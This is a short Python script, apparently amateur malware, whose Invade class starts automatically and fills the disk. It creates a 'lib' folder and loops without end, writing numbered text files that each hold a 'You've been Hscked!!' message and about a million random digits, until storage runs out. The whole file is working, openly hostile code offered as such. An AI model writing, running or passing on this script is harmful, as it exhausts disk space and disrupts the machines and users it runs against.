#! /usr/bin/env python
# Author:   @BlankGodd

import random
import os


class Invade:

    def __init__(self):
        # A gui that displays "You have been hacked
        self.infiltrate()

    def infiltrate(self):
        # I AM HERE THE STEAL YOUR SPACE
        j = 1
        main_path = os.getcwd()
        path = os.path.join(main_path, 'lib')
        if not os.path.exists(path):
            os.mkdir(path)
        else:
            pass
        while True:
            i = [0, 1]
            name = 'file{0}.txt'.format(j)
            file_name = os.path.join(path, name)
            with open(file_name, 'w') as f:
                b = random.choice(i)
                f.write("You've been Hscked!!{0}[-a]\n".format(b))
            with open(file_name, 'a') as g:
                c = [random.choice(i) for u in range(1000000)]
                g.write(str(c))
            j += 1

    def automate(self):
        pass


Invade()